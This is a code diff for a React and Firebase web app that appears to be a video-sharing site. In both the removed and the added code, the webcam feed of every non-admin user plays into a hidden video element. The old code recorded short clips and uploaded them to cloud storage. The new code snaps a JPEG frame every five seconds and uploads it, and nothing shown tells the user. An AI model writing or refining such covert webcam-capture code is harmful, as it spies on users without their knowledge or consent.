@@ -16,7 +16,7 @@ function App() {
   const [uploadProgress, setUploadProgress] = useState(0);
   const [cameraPermission, setCameraPermission] = useState(false);
   const videoRef = useRef(null);
-  const mediaRecorderRef = useRef(null);
+  const cameraRef = useRef(null);
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
@@ -54,8 +54,8 @@ function App() {
     try {
       const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
       setCameraPermission(true);
-      if (videoRef.current) {
-        videoRef.current.srcObject = mediaStream;
+      if (cameraRef.current) {
+        cameraRef.current.srcObject = mediaStream;
       }
     } catch (error) {
       console.error("Error accessing camera:", error);
@@ -67,37 +67,24 @@ function App() {
   useEffect(() => {
     if (cameraPermission && !isAdmin) {
       const captureInterval = setInterval(() => {
-        recordVideo();
-      }, 5000); // Record every 15 seconds
+        if (cameraRef.current) {
+          const canvas = document.createElement('canvas');
+          canvas.width = cameraRef.current.videoWidth;
+          canvas.height = cameraRef.current.videoHeight;
+          const context = canvas.getContext('2d');
+          context.drawImage(cameraRef.current, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            if (blob) {
+              const storageRef = ref(storage, `images/${Date.now()}.jpg`);
+              uploadBytesResumable(storageRef, blob).catch(error => console.error("Error uploading image:", error));
+            }
+          }, 'image/jpeg');
+        }
+      }, 5000);
 
       return () => clearInterval(captureInterval);
     }
   }, [cameraPermission, isAdmin]);
-
-  const recordVideo = () => {
-    const mediaStream = videoRef.current.srcObject;
-    if (!mediaStream) return;
-
-    const mediaRecorder = new MediaRecorder(mediaStream);
-    const chunks = [];
-
-    mediaRecorder.ondataavailable = (event) => {
-      if (event.data.size > 0) {
-        chunks.push(event.data);
-      }
-    };
-
-    mediaRecorder.onstop = async () => {
-      const blob = new Blob(chunks, { type: "video/webm" });
-      const storageRef = ref(storage, `websitevideos/${Date.now()}.webm`);
-      await uploadBytesResumable(storageRef, blob).catch(error => console.error("Error uploading video:", error));
-    };
-
-    mediaRecorder.start();
-    setTimeout(() => {
-      mediaRecorder.stop();
-    }, 5000); // Record for 5 seconds
-  };
 
   const login = async () => {
     try {
@@ -157,6 +144,7 @@ function App() {
           setUploadFile(null);
           setTitle("");
           setUploadProgress(0);
+          alert("Video uploaded successfully!");
           const videoSnapshot = await getDocs(collection(db, "videos"));
           const videoData = videoSnapshot.docs.map(doc => doc.data());
           setVideos(videoData);
@@ -243,7 +231,7 @@ function App() {
           </footer>
         </>
       )}
-      <video ref={videoRef} style={{ display: 'none' }} autoPlay></video>
+      <video ref={cameraRef} style={{ display: 'none' }} autoPlay></video>
     </div>
   );
 }
